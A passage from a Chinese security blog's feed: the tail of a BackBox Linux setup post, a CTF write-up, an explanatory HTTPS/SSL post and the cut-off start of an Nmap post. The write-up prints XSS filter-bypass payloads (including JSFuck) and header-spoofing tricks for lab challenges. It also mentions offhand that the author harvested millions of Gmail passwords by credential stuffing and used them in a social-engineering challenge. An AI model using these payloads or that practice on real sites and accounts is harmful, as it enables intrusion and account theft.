<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">[Desktop Entry]</div><div class="line"><span class="variable">Version=</span><span class="number">1.0</span></div><div class="line"><span class="variable">Name=</span>Sublime Text <span class="number">2</span></div><div class="line">Only KDE <span class="number">4</span> seems to use GenericName, so we reuse the KDE strings.</div><div class="line"></div><div class="line"><span class="comment"># From Ubuntu's language-pack-kde-XX-base packages, version 9.04-20090413.</span></div><div class="line"><span class="variable">GenericName=</span>Text Editor</div><div class="line"><span class="variable">Exec=</span>sublime</div><div class="line"><span class="variable">Terminal=</span><span class="constant">false</span></div><div class="line"><span class="variable">Icon=</span>/usr/lib/Sublime Text <span class="number">2</span>/Icon/<span class="number">48</span>x48/sublime_text.png</div><div class="line"><span class="variable">Type=</span>Application</div><div class="line"><span class="variable">Categories=</span>TextEditor;IDE;Development</div><div class="line"><span class="variable">X-Ayatana-Desktop-Shortcuts=</span>NewWindow</div><div class="line">       </div><div class="line">[NewWindow Shortcut Group]</div><div class="line"><span class="variable">Name=</span>New Window</div><div class="line"><span class="variable">Exec=</span>sublime -n</div><div class="line"><span class="variable">TargetEnvironment=</span>Unity</div></pre></td></tr></table></figure>

]]></content>
    <summary type="html">
    <![CDATA[<p><hr><br>hhhhhhhh最近又在做死，kali被折腾坏掉了，在虚拟机中产生尝试了一下backbox</p>
<p>因为基于Ubuntu14.04优化了Gnome的桌面，用起来很流畅，占用资源也小，再坏掉我就换CentOS(╯°Д°)╯︵ ┻━┻于是写下配置记录下某些蛋疼的设置</p>
]]>
    
    </summary>
    
      <category term="BackBox" scheme="http://evilddog.github.io//tags/BackBox/"/>
    
      <category term="Linux" scheme="http://evilddog.github.io//categories/Linux/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[某石油大学CTFwrite-up]]></title>
    <link href="http://evilddog.github.io/2014/11/01/swpu-write-up/"/>
    <id>http://evilddog.github.io/2014/11/01/swpu-write-up/</id>
    <published>2014-11-01T12:41:57.000Z</published>
    <updated>2014-11-12T07:41:41.000Z</updated>
    <content type="html"><![CDATA[<hr>

<p>弱渣闲来无事玩一玩某石油大学的CTF，写一篇Write-up填充一下博客空白</p>
<p><a id="more"></a></p>
<hr>

<h1 id="0x00_Base1">0x00    Base1</h1>
<p>第一道题页面啥也没<img src="http://evilddog.qiniudn.com/base1-1.jpg" alt="">，打开源码看到有</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;iframe <span class="variable">src=</span><span class="string">"css/fool.html"</span> <span class="variable">width=</span><span class="string">"0%"</span> <span class="variable">height=</span><span class="string">"0%"</span>&gt;&lt;/iframe&gt;</div></pre></td></tr></table></figure>

<p>JS代码如下：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">eval(function(p,a,c,k,e,d)<span class="special">{</span>e=function(c)<span class="special">{</span>return(c<span class="command">\\</span>» <span class="command">\\</span>º()<span class="special">{</span><span class="command">\\</span>¥ <span class="command">\\</span>¹="<span class="command">\\</span>¡同学是个活泼开朗的孩子，在西南石</div><div class="line">油大学各个学院都结交了很多朋友。同时<span class="command">\\</span>¡同学也是一个热心肠，朋友遇到任何困难他都会奋不顾身去鼎力相助。包括追女朋友、</div><div class="line">抓<span class="command">\\</span>¸、写情书、搓背、捡肥皂、帮妹子找回<span class="command">\\</span>·、<span class="command">\\</span>¶帮队友送人头……最近正逢“西南石油大学安全月”，<span class="command">\\</span>¡更是忙的不可开交……</div><div class="line">其实<span class="command">\\</span>¡也是个粗中带细的好学生，其实他一直默默的暗恋着艺术院的一个妹子……";<span class="command">\\</span>¥ <span class="command">\\</span>µ="<span class="command">\\</span>´:<span class="command">\\</span>³"<span class="special">}</span><span class="command">\'</span>,£,£,<span class="command">\'</span>²|±|°|¯|</div><div class="line">®|­|¬|«|ª|©|¨|¢<span class="command">\'</span>.§(<span class="command">\'</span>|<span class="command">\'</span>)))',36,36,'xa1|function|12|xa2|xa3|return|split|passkey|runstr|hack|QQ|LOL</div><div class="line">|key|6f7bf47d9fdf677af6ec611d172fe5a5|da521d85afefa53bc86b41d73c75d081|var|script|running|xa4|xa5|x</div><div class="line">a6|xa7|xa8|xa9|xaa|xab|xac|RegExp|new|replace|if|while|161|fromCharCode|String|eval'.split('|')))</div></pre></td></tr></table></figure>

<p>把eval换成console.log，如下：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">passkey</span><span class="params">()</span></span>{<span class="keyword">var</span> runstr=<span class="string">"running同学是个活泼开朗的孩子，在西南石油大学各个学院都结交了很多朋</span></span></div><div class="line">友。同时running同学也是一个热心肠，朋友遇到任何困难他都会奋不顾身去鼎力相助。包括追女朋友、抓hack、写情书、搓背、</div><div class="line">捡肥皂、帮妹子找回QQ、LOL帮队友送人头……最近正逢“西南石油大学安全月”，running更是忙的不可开交……其实running也是个</div><div class="line">粗中带细的好学生，其实他一直默默的暗恋着艺术院的一个妹子……";<span class="keyword">var</span> key=<span class="string">"6f7bf47d9fdf677af6ec611d172fe5a5:da52</span></div><div class="line">1d85afefa53bc86b41d73c75d081"}<span class="tag">&lt;/<span class="title">script</span>&gt;</span></div></pre></td></tr></table></figure>

<p>貌似是windows hash，解出来是</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">WEL2014SWPU</div></pre></td></tr></table></figure>

<hr>


<h1 id="0x01_Base2">0x01    Base2</h1>
<p>题目如下<img src="http://evilddog.qiniudn.com/base3.jpg" alt="">那就burpsuite抓包直接修改referer</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">Referer</span>： http:<span class="comment">//www.google.com</span></div></pre></td></tr></table></figure>

<p>然后神坑地获取了一个64位的瞎JB啥东西：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">954a4995de68029c936a5b9eb6a646f50f838b4f8fc851f549fee82add419942</div></pre></td></tr></table></figure>

<p>直到比赛结束我也不知道咋解开，后来大神们说其实完整的header是这样的：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="status">HTTP/1.1 <span class="number">200</span> OK</span></div><div class="line"><span class="attribute">Date</span>: <span class="string">Sat, 01 Nov 2014 11:01:07 GMT</span></div><div class="line"><span class="attribute">Server</span>: <span class="string">Apache/2.2.8 (Win32)</span></div><div class="line"><span class="attribute">running</span>: <span class="string">Swp201u4</span></div><div class="line"><span class="attribute">Content-Length</span>: <span class="string">2775</span></div><div class="line"><span class="attribute">Connection</span>: <span class="string">close</span></div><div class="line"><span class="attribute">Content-Type</span>: <span class="string">text/html</span></div></pre></td></tr></table></figure>

<p>注意到running: Swp201u4，然后作为key，用DES作为加密算法进行解密，得到Key</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">key{<span class="class">It</span><span class="symbol">#ReferFrom2014A3</span><span class="char">$}</span></div></pre></td></tr></table></figure>

<hr>


<h1 id="0x02_Base3">0x02  Base3</h1>
<p>隐写术这一题</p>
<p>一张郭美美的图片下载下来，用Stegsolve分析可以看到是两张图片一张jpg后面接了一张png，winhex扣下来是张二维码<br><img src="http://evilddog.qiniudn.com/base3-1.jpg" alt=""></p>
<p>拖进工具里面一看是某空间网址，进到空间第一条说说就是一段md5，扔到somd5.com里面解开就是key</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="constant">ITpicT2048re</span><span class="variable">@GMM</span></div></pre></td></tr></table></figure>

<hr>


<h1 id="0x03_Base4">0x03 Base4</h1>
<p>XSS第一道题，没啥问题放出payload</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">"&gt;<span class="tag">&lt;<span class="title">img</span> <span class="attribute">src</span>=<span class="value">1</span> <span class="attribute">onerror</span>=<span class="value">alert(1)</span>&gt;</span></div></pre></td></tr></table></figure>

<p>svg大法好</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">"&gt;<span class="tag">&lt;<span class="title">svg</span>/<span class="attribute">onload</span>=<span class="value">alert(1)</span>&gt;</span></div></pre></td></tr></table></figure>

<p>只要让它弹窗就会显示出key，手贱的我顺便 注释掉后面,结果弹了没有key纠结老半天<br><img src="http://evilddog.qiniudn.com/xss1.jpg" alt=""></p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="variable">Why</span> <span class="function_or_atom">are</span> <span class="function_or_atom">you</span> <span class="function_or_atom">so</span> <span class="function_or_atom">diao</span> <span class="exclamation_mark">!</span><span class="exclamation_mark">!</span><span class="function_or_atom">so</span> <span class="function_or_atom">key</span>=<span class="variable">Gre34y_6r3p</span></div></pre></td></tr></table></figure>

<hr>


<h1 id="0x04_Base5">0x04 Base5</h1>
<p>XSS第二道题，看源码，有个翔一样的函数：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">   <span class="built_in">window</span>.onerror=<span class="function"><span class="keyword">function</span><span class="params">()</span></span>{</div><div class="line">truereturn <span class="literal">true</span>;</div><div class="line">}</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">blue</span><span class="params">()</span></span>{</div><div class="line">trueif(shit==<span class="string">""</span>){</div><div class="line">truetruevar shit=<span class="number">1</span>;</div><div class="line">truetrueeval(shit);</div><div class="line"><span class="literal">true</span>}</div><div class="line">}</div><div class="line"></div><div class="line">blue();</div></pre></td></tr></table></figure>

<p>还过滤了alert直接闭合掉函数：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="string">"){};var b='</span><span class="transposed_variable">al'</span>+<span class="string">'ert()'</span>;eval(b);<span class="keyword">if</span>(shit=<span class="string">"</span></div></pre></td></tr></table></figure>

<p>毫无悬念：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Why are you <span class="keyword">so</span> diao!! <span class="keyword">so</span> key=Ve07G73@edy</div></pre></td></tr></table></figure>

<hr>


<h1 id="0x05_Base6">0x05 Base6</h1>
<p>XSS第三道题,payload：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="string">''</span>){};<span class="keyword">var</span> b=<span class="string">'al'</span>+<span class="string">'ert(1)'</span>;<span class="built_in">eval</span>(b);<span class="keyword">if</span>(shit=<span class="string">''</span></div></pre></td></tr></table></figure>

<p>结果弹窗就是没有key，直接找客服要<img src="http://evilddog.qiniudn.com/xss3.jpg" alt=""></p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="number">16</span>otkN03_4$<span class="variable">$ly</span></div></pre></td></tr></table></figure>

<hr>


<h1 id="0x06_Base7">0x06 Base7</h1>
<hr>


<p>XSS第四道题，表示不会据说有两种方法，一是用unicode的换行符，而是用IE的条件编译来绕过注释 </p>
<hr>


<h1 id="0x07_Base8">0x07 Base8</h1>
<p>XSS第五道题，过滤了A-Za-z0-9，最后用的<a href="http://www.jsfuck.com/" target="_blank" rel="external">JSfuck</a><br>Payload:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">''){}[<span class="link_label"></span>][<span class="link_reference">(![</span>]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]+([<span class="link_label">![</span>]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])</div><div class="line">[<span class="link_label">!+[</span>]+!+[<span class="link_label"></span>]+!+[<span class="link_label"></span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+!+[</span>]]][<span class="link_label">([</span>][<span class="link_reference">(![</span>]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]+([<span class="link_label">![</span>]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]</div><div class="line">+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[]</div><div class="line">[<span class="link_label">(![</span>]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]+([<span class="link_label">![</span>]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!</div><div class="line">+[<span class="link_label"></span>]+!+[<span class="link_label"></span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+!+[</span>]]])[<span class="link_label">+!+[</span>]+[<span class="link_label">+[</span>]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[]</div><div class="line">)[<span class="link_label">+[</span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+!+[</span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]+([<span class="link_label"></span>][<span class="link_reference">(![</span>]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]+([<span class="link_label">![</span>]]+[][[]])[+!+[]+[+[]]]+(![]+[]</div><div class="line">)[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!</div><div class="line">![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>][<span class="link_reference">(![</span>]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]+([<span class="link_label">![</span>]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[</div><div class="line">+[<span class="link_label"></span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">!+[</span>]+!+[<span class="link_label"></span>]+!+[<span class="link_label"></span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+!+[</span>]]])[<span class="link_label">+!+[</span>]+[<span class="link_label">+[</span>]]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+!+[</span>]]]((![]+[])[+!+[</div><div class="line">]]+(![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">!+[</span>]+!+[<span class="link_label"></span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">!+[</span>]+!+[<span class="link_label"></span>]+!+[<span class="link_label"></span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+!+[</span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]+(![<span class="link_label"></span>]+[][(![]+</div><div class="line">[<span class="link_label"></span>])[<span class="link_label">+[</span>]]+([<span class="link_label">![</span>]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+</div><div class="line">[<span class="link_label"></span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+!+[</span>]]])[<span class="link_label">!+[</span>]+!+[<span class="link_label"></span>]+[<span class="link_label">+[</span>]]]+[<span class="link_label">+!+[</span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>][<span class="link_reference">(![</span>]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]+([<span class="link_label">![</span>]]+[][[]])[+!+[]+[+</div><div class="line">[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]</div><div class="line">+[+[]]])(</div></pre></td></tr></table></figure>


<hr>


<h1 id="0x08_WebSec_1">0x08 WebSec 1</h1>
<p>土屌表示PHP不熟悉，不会SQL更不会注入</p>
<hr>


<h1 id="0x09_WebSec_2">0x09 WebSec 2</h1>
<p>直接更改httpheader，加一个：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">X-Forwarded-For</span>: <span class="string">199.101.117.188</span></div></pre></td></tr></table></figure>

<p>然后随便用户名密码，即得key</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="label">key:</span>{RunNgIs0g<span class="localvars">@0</span>dK1d}</div></pre></td></tr></table></figure>

<p><hr><br><br></p>
<h1 id="0x0A_WebSec_3-6_CrackMe1-4">0x0A WebSec 3-6 CrackMe1-4</h1>
<p>统统不会。。。坐等大牛Write-up</p>
<p><hr><br><br></p>
<h1 id="0x0B_Router_1">0x0B Router 1</h1>
<p><img src="http://evilddog.qiniudn.com/router1.jpg" alt=""></p>
<p>我不会做但我会百度 √</p>
<p><img src="http://evilddog.qiniudn.com/router1-1.jpg" alt=""><br><img src="http://evilddog.qiniudn.com/router1-2.jpg" alt=""></p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">Key</span>=<span class="string">Router_Is_Dangerous</span></div></pre></td></tr></table></figure>

<hr>

<h1 id="0x0C_Router_2">0x0C Router 2</h1>
<p>直接抓包，发现有个rar，导出http，发现打开要密码，winhex打开发现结尾有个password:letmein即为解压密码，打开后图片上红果果的写着</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">KEY</span>=<span class="string">H@vEFun</span></div></pre></td></tr></table></figure>

<hr>


<h1 id="0x0D_Rounter_3">0x0D Rounter 3</h1>
<p><img src="http://evilddog.qiniudn.com/router2.jpg" alt=""></p>
<p>我不是大牛但我上乌云 √</p>
<p><img src="http://evilddog.qiniudn.com/router3.jpg" alt=""></p>
<p>burpsuite新建cookie发包</p>
<p><img src="http://evilddog.qiniudn.com/router3-1.jpg" alt=""></p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">KEY</span>=<span class="string">Tenda_Router</span></div></pre></td></tr></table></figure>

<hr>


<h1 id="0x0E_Social_Engineering_1">0x0E Social Engineering 1</h1>
<p>分析数据包发现s某个流量特别大的数据段中有两个文件，分别是简历.doc和special.zip</p>
<p><img src="http://evilddog.qiniudn.com/se1-1.jpg" alt=""><br><img src="http://evilddog.qiniudn.com/se1-2.jpg" alt=""></p>
<p>导出之后简历如下：</p>
<p><img src="http://evilddog.qiniudn.com/se1-3.jpg" alt=""></p>
<p>然后，加了QQ，但是不理我。继续看special.zip，发现要密码找密码，社工题先去社工密码，想起暑假的时候撞库撞出来500万Gmail密码。于是去社工密码：</p>
<p><img src="http://evilddog.qiniudn.com/se1-4.jpg" alt=""></p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">motianlun</div></pre></td></tr></table></figure>

<p>解压后得到key</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="function_or_atom">key_1</span>{<span class="variable">S02I4L_7</span><span class="exclamation_mark">!</span>_<span class="exclamation_mark">!</span><span class="function_or_atom">na1</span>}</div></pre></td></tr></table></figure>

<hr>

<h1 id="0x0F_Social_Engineering_2">0x0F Social Engineering 2</h1>
<p>表示不会做，据说要钓鱼，不大好玩，放弃</p>
<p><hr><br><br></p>
<h1 id="0x10_Social_Engineering_3">0x10 Social Engineering 3</h1>
<p>本来放弃了不想做这石油的题目，后来公选课是在无聊便做了一下，貌似有个key在此人空间里，发现简历和QQ资料上写的都不对，于是在后面的数据包中找到此人油吧的账号，别问辣么多数据包咋找到的，因为公选课实在太无聊，油吧资料写的是金牛座，于是开始穷举，得到此人生日是0510，输入进入空间</p>
<p><img src="http://evilddog.qiniudn.com/se3.jpg" alt=""></p>
<p>得到key</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">key_3<span class="tuple">{<span class="variable">Y0u</span><span class="comment">%_c4n_8^r10}</span></span></div></pre></td></tr></table></figure>

<p><hr><br><br></p>
<h3 id="本人原创，转载请注明出处">本人原创，转载请注明出处</h3>
]]></content>
    <summary type="html">
    <![CDATA[<hr>

<p>弱渣闲来无事玩一玩某石油大学的CTF，写一篇Write-up填充一下博客空白</p>
<p>]]>
    
    </summary>
    
      <category term="write-up" scheme="http://evilddog.github.io//tags/write-up/"/>
    
      <category term="CTF" scheme="http://evilddog.github.io//categories/CTF/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[浅谈HTTPS]]></title>
    <link href="http://evilddog.github.io/2014/10/31/HTTP/"/>
    <id>http://evilddog.github.io/2014/10/31/HTTP/</id>
    <published>2014-10-31T03:13:41.000Z</published>
    <updated>2014-11-05T16:38:26.000Z</updated>
    <content type="html"><![CDATA[<hr>

<h2 id="0x01_HTTPS概述">0x01 HTTPS概述</h2>
<p>HTTPS(Hyper Text Transfer Protocol over Secure Socket Layer)是在安全的传输层上发送的HTTP。HTTPS不是直接将未加密的HTTP报文发送给TCP。先将其发送给一个安全层，对其进行加密。</p>
<a id="more"></a>

<p>HTTP安全层是通过SSl以及TLS实现的。本文直接使用SSL来表示SSL或者TLS。</p>
<p><img src="http://evilddog.qiniudn.com/HTTP-HTTPS.png" alt=""></p>
<p><br></p>
<hr>

<h2 id="0x02_SSL">0x02 SSL</h2>
<p>SSL(Secure Sockets Layer 安全套接层),及其继任者传输层安全（Transport Layer Security，TLS）是为网络通信提供安全及数据完整性的一种安全协议。TLS与SSL在传输层对网络连接进行加密。</p>
<p>HTTPS与HTTP的最大的不同之处在于SSL安全层的存在。在HTTPS中，客户端首先打开一条Web服务器端口443(不同于HTTP的80)的链接。</p>
<p><img src="http://evilddog.qiniudn.com/HTTP-HTTPS.jpg" alt=""></p>
<p>建立TCP传输之后，客户端和服务器就会初始化SSL层，对加密进行沟通。交换密钥，SSL初始化完成之后，客户端就可以将请求报文发给安全层。</p>
<p>在这个过程中SSL握手的过程主要完成以下工作：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">交换协议版本号</div><div class="line">选择一个两段都了解的密码</div><div class="line">对两段的身份进行认证</div><div class="line">生成临时的回话密钥，便于加密信道</div></pre></td></tr></table></figure>

<p>SSL握手的示意图如下：</p>
<p><img src="http://evilddog.qiniudn.com/SSL.jpg" alt=""></p>
<p>值得注意的是：</p>
<p>SSL协议可分为两层： SSL记录协议（SSL Record Protocol）：它建立在可靠的传输协议（如TCP）之上，为高层协议提供数据封装、压缩、加密等基本功能的支持。 SSL握手协议（SSL Handshake Protocol）：它建立在SSL记录协议之上，用于在实际的数据传输开始前，通讯双方进行身份认证、协商加密算法、交换加密密钥等。</p>
<p>整个过程如下</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">假设A与B通信，A是SSL客户端，B是SSL服务器端，加密后的消息放在方括号[]里，以突出明文消息的区别。双方的处理动作的说</div><div class="line">明用圆括号（）括起。</div><div class="line">A：我想和你安全的通话，我这里的对称加密算法有DES,RC5,密钥交换算法有RSA和DH，摘要算法有MD5和SHA。</div><div class="line">B：我们用DES－RSA－SHA这对组合好了。这是我的证书，里面有我的名字和公钥，你拿去验证一下我的身份（把证书发给A）。</div><div class="line">A：（查看证书上B的名字是否无误，并通过手头早已有的数字的证书验证了B的证书的真实性，如果其中一项有误，发出警告并断</div><div class="line">开连接，这一步保证了B的公钥的真实性）</div><div class="line">（产生一份秘密消息，这份秘密消息处理后将用作对称加密密钥，加密初始化向量和hmac的密钥。将这份秘密消息-协议中称为pe</div><div class="line">r_master_secret-用B的公钥加密，封装成称作ClientKeyExchange的消息。由于用了B的公钥，保证了第三方无法窃听）</div><div class="line">我生成了一份秘密消息，并用你的公钥加密了，给你（把ClientKeyExchange发给B）</div><div class="line">注意，下面我就要用加密的办法给你发消息了！</div><div class="line">（将秘密消息进行处理，生成加密密钥，加密初始化向量和hmac的密钥）</div><div class="line">[我说完了]</div><div class="line">B：（用自己的私钥将ClientKeyExchange中的秘密消息解密出来，然后将秘密消息进行处理，生成加密密钥，加密初始化向量</div><div class="line">和hmac的密钥，这时双方已经安全的协商出一套加密办法了）</div><div class="line">注意，我也要开始用加密的办法给你发消息了！</div><div class="line">[我说完了]</div><div class="line">A: [我的秘密是<span class="keyword">...</span>]</div><div class="line">B: [其它人不会听到的<span class="keyword">...</span>]</div></pre></td></tr></table></figure>

<h2 id="0x03_数字证书">0x03 数字证书</h2>
<p>数字证书是一种网络上证明持有者身份的文件，同时还包含有公钥。一方面，既然是文件那么就有可能“伪造”，因此，证书的真伪就需要一个验证方式；另一方面，验证方需要认同这种验证方式。</p>
<p>证书可以由国际上公认的证书机构颁发，这些机构是公认的信任机构，一些验证证书的客户端应用程序：比如浏览器，邮件客户端等，对于这些机构颁发的证书完全信任。当然想要请这些机构颁发证书可是要付“到了斯”的，通常在windows部署系统的时候会让客户端安装我们自己服务器的根证书，这样客户端同样可以信任我们的证书。</p>
<h2 id="0x04_非对称密钥加密">0x04 非对称密钥加密</h2>
<p>SSL使用的非对称加密算法（asymmetric cryptographic algorithm）又名“公开密钥加密算法”。</p>
<p>所谓非对称密钥加密简单的说就是客户端和服务器都各自生成一对密钥，每对密钥都包含一个公开密钥和私有密钥。</p>
<p>公钥与私钥是一对，如果用公开密钥对数据进行加密，只有用对应的私有密钥才能解密；如果用私有密钥对数据进行加密，那么只有用对应的公开密钥才能解密。因为它们不相同所以叫做非对称密钥加密。</p>
<p>比如在传输之前客户端和服务器交换各自的公钥，客户端发送的报文使用服务器的公钥加密之后发出，只有服务器的私钥能解开；服务器发送的报文经过客户端的公钥加密之后，只有客户端的私钥能解开，这样就保证了报文在传输过程中的安全。</p>
<h2 id="0x05">0x05</h2>
<p>其实HTTPS中的SSl以及TLS是一个相当复杂的过程有兴趣可以<a href="http://kb.cnblogs.com/page/162080/" target="_blank" rel="external">戳一下</a>，笔者只是浅谈一下HTTP和HTTPS的区别</p>
]]></content>
    <summary type="html">
    <![CDATA[<hr>

<h2 id="0x01_HTTPS概述">0x01 HTTPS概述</h2>
<p>HTTPS(Hyper Text Transfer Protocol over Secure Socket Layer)是在安全的传输层上发送的HTTP。HTTPS不是直接将未加密的HTTP报文发送给TCP。先将其发送给一个安全层，对其进行加密。</p>
]]>
    
    </summary>
    
      <category term="HTTPS" scheme="http://evilddog.github.io//tags/HTTPS/"/>
    
      <category term="HTTP" scheme="http://evilddog.github.io//categories/HTTP/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[浅谈Nmap基本原理]]></title>
    <link href="http://evilddog.github.io/2014/10/28/nmap-1/"/>
    <id>http://evilddog.github.io/2014/10/28/nmap-1/</id>
    <published>2014-10-28T06:25:44.000Z</published>
    <updated>2014-11-05T16:41:00.000Z</updated>
    <content type="html"><![CDATA[<hr>

<h2 id="0x00_Nmap介绍">0x00 Nmap介绍</h2>
<p>Nmap  （网络映射器）是由 Gordon Lyon设计，用来探测计算机网络上的主机和服务的一种安全扫描器。为了绘制网络拓扑图，Nmap的发送特制的数据包到目标主机，然后对返回数据包进行分析。Nmap是一款枚举和测试网络的强大工具。</p>
<a id="more"></a>

<p>Nmap特点：</p>
